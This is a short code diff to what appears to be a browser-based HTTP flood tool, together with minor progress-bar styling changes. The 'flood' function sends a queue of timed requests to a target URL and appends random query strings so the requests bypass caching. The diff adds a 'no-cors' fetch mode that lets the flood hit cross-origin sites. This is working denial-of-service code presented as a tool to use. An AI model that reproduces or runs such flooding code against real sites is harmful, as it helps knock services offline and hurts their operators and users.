@@ -67,7 +67,7 @@ async function flood(target) {
     }
     rand = i % 13 === 0 ? '' : ('?' + Math.floor(Math.random() * 1000))
     queue.push(
-      fetchWithTimeout(target+rand, { timeout: 1000 })
+      fetchWithTimeout(target+rand, { timeout: 1000, mode: 'no-cors' })
         .catch((error) => {
           if (error.code === 20 /* ABORT */) {
             return;
@@ -97,7 +97,7 @@ function myProgressbar(id) {
         document.getElementById(id),
         {
           display: 'inline-block',
-          width: '500px',
+          width: '50%',
           background: '#070719',
           borderRadius: '8px',
         },
@@ -108,6 +108,7 @@ function myProgressbar(id) {
           margin: '10px',
           height: '40px',
           background: 'white',
+          width: '50%',
         },
       ],
     },
